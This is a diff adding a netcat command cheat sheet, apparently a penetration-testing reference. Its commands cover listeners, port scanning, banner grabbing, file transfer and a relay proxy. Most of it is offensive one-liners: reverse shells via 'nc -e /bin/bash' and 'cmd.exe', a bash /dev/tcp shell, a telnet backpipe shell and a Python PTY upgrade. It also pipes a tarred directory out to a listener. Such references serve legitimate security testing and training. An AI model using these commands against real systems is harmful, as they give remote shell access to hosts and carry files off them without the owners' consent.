@@ -1,0 +1,80 @@
+# Listener --listen --verbose --port
+
+nc -lvp [port]
+
+# Connect back to listner (send data, chat)
+
+nc [ip] [port]
+
+# Push Reverse Shells - ip , port , execute
+
+nc 0.0.0.0 1234 -e /bin/bash
+nc 0.0.0.0 1234 -e cmd.exe
+
+# Once RevShell Connected - Call a Pseudo Terminal with python
+
+python -c "import pty;pty.spawn('/bin/bash')"
+
+
+# Push a BashShell Witout NetCat                                    
+
+nc -lnvvp [port]
+
+/bin/bash -i > /dev/tcp/[listenerip]/[port] 0<&1 2>&1
+
+
+# Levarage Telnet to Push a BashShell Witout NetCat
+
+nc -lnvvp [port]
+
+mknod backpipe p && telnet [listnerIP] [port] 0<backpipe | /bin/bash 1>backpipe
+
+
+# File Transfer - grab from a listener
+
+nc -l -p [port] < [fileName]
+nc -w3 [targetIP] [port] > [fileName]
+
+
+# File Transfer - push a file to a listener
+
+nc -l -p [port] > [filename]
+nc -w3 [targetIP] [port] < [fileName]
+
+
+# Push out a directory to a listener
+
+tar zcfv - [dir] | nc -q 5 -lp [port]
+nc [targetIP] [port] [dir].tar.gz
+
+
+
+# Poor Man's Video Streaming (server - Client) 
+
+nc -l [port] < [fullpathto+video]
+nc [server] [port] | vlc [fullpathto+video]
+
+
+
+# Port Scanning... Single
+
+nc -nvz [ip] [port]
+
+
+# Port Scanning... Range of Ports (listing only open)
+
+nc -nvz [ip] [startPort]-[finishPort]
+
+
+# Banner Grabbing
+
+nc -vn [ip] [port]
+^C
+
+
+
+# Leveraging as a Proxy
+
+nc -l -p 9999 | nc www.google.com 80 | nc -l -p 1337
+
+
